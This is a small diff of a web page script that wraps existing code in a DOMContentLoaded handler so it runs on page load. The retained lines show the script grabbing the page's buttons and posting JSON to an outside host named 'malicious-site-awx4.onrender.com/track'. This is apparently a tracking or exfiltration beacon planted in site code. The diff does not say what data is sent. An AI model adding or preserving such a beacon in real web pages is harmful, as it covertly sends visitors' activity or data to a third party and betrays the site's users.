@@ -1,4 +1,4 @@
-(function () {
+document.addEventListener("DOMContentLoaded", function () {
   const button = document.getElementsByTagName("button");
   const link = "https://malicious-site-awx4.onrender.com/track";
 
@@ -9,4 +9,4 @@
       "Content-Type": "application/json",
     },
   });
-})();
+});
